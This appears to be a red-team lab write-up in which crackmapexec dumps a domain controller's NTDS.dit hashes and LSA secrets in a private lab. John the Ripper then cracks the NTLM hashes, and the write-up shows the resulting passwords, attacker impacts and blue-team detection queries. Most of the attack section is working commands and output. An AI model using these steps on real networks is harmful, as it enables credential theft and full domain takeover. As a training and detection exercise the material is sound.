
Credential Dumping - NTDS.dit Extraction

## Objective
After gaining Domain Admin access, extract all domain user password hashes from the Domain Controller.

## Commands Used

### 1. Dump NTDS.dit (All Domain Hashes)
```bash
crackmapexec smb 192.168.56.10 -u 'Administrator' -p 'password@123' --ntds
2. Dump LSA Secrets
bash
crackmapexec smb 192.168.56.10 -u 'Administrator' -p 'password@123' --lsa
3. Save Hashes to File
bash
cat > hashes.txt << EOF
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6de00c52dbabb0e95c074e3006fcf36e:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bcfb72e4c6b618fc1fc6b736c895d854:::
john.doe:1103:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
it.admin:1104:aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab:::
svc.backup:1105:aad3b435b51404eeaad3b435b51404ee:ebf13990fc7777d1deeec286923901c7:::
EOF
 Extracted Hashes
User	RID	NTLM Hash
Administrator	500	6de00c52dbabb0e95c074e3006fcf36e
krbtgt	502	bcfb72e4c6b618fc1fc6b736c895d854
john.doe	1103	a29f7623fd11550def0192de9246f46b
it.admin	1104	570a9a65db8fba761c1008a51d4c95ab
svc.backup	1105	ebf13990fc7777d1deeec286923901c7
DC01$	1000	da41b2971e01dee8e3ab229fa6dafe6b
WIN10-CLIENT$	1109	18bf6508935b93abfe859ef383da6c0a
 Password Cracking
Using John the Ripper
bash
# Create hash file with just the NTLM hashes
cat > ntlm-hashes.txt << EOF
6de00c52dbabb0e95c074e3006fcf36e
a29f7623fd11550def0192de9246f46b
570a9a65db8fba761c1008a51d4c95ab
ebf13990fc7777d1deeec286923901c7
EOF

# Crack with rockyou.txt
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlm-hashes.txt
Results
text
6de00c52dbabb0e95c074e3006fcf36e:password@123
a29f7623fd11550def0192de9246f46b:Password123
570a9a65db8fba761c1008a51d4c95ab:Admin@123
 Impact
With these hashes, an attacker can:

Pass-the-Hash to any domain machine

Crack weak passwords offline

Use krbtgt hash to forge Golden Tickets

Maintain persistence in the domain

 Blue Team Detection
What to look for:
Event ID 4662: Access to Active Directory

Volume Shadow Copy creation: vssadmin or wmic usage

Event ID 4688: Process creation for dumping tools

File access: ntds.dit accessed unexpectedly

Sample Detection Query
powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4662} | 
    Where-Object {$_.Message -like "*ntds*"} |
    Format-Table TimeCreated, Message -AutoSize
 Evidence
https://../screenshots/03-ntds-dump.png
[https://../screenshots/05-cracked-hashes.png](https://github.com/MANOJ-MESTA/REDTEAM-LABS/blob/main/Project-2-Red-vs-Blue-Simulation/screenshots/cracked-hashes.png?raw=true)
